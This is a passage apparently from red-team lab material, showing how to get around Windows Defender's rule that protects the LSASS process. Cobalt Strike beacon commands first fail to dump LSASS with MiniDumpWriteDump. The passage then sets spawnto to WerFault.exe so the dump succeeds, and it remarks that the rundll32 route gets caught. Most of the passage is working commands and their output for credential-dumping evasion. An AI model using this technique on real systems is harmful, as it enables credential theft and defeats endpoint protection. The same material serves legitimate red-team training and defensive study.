_"This rule helps prevent credential stealing, by locking down Local Security Authority Subsystem Service (LSASS)."_

At its heart, this rule prevents you from opening a handle to LSASS with PROCESS_VM_READ privileges.  As an example, we can try and read LSASS using the **MiniDumpWriteDump** API.

```
beacon> getuid
[*] You are RTO2\amoss (admin)

beacon> spawnto x64 C:\Windows\System32\notepad.exe
[*] Tasked beacon to spawn x64 features to: C:\Windows\System32\notepad.exe

beacon> execute-assembly C:\Tools\MiniDumpWriteDump\bin\Debug\MiniDumpWriteDump.exe
[X] MiniDumpWriteDump Failed
```

>  I'm ensuring the spawnto is set to notepad because Defender will catch and kill the Beacon if rundll32 is used.

As with other ASR rules, not all processes appear to be blocked.  WerFault (Windows Error Reporting) is an application responsible for error reporting on Windows.  When an application crashes, werfault.exe is spawned as a child and collects debug information for reporting purposes.

By setting our spawnto to werfault, we can obtain a handle to LSASS which includes the permission to read its memory.

```
beacon> spawnto x64 C:\Windows\System32\WerFault.exe
[*] Tasked beacon to spawn x64 features to: C:\Windows\System32\WerFault.exe
[+] host called home, sent: 40 bytes

beacon> execute-assembly C:\Tools\MiniDumpWriteDump\bin\Debug\MiniDumpWriteDump.exe
[!] MiniDumpWriteDump Succeeded
```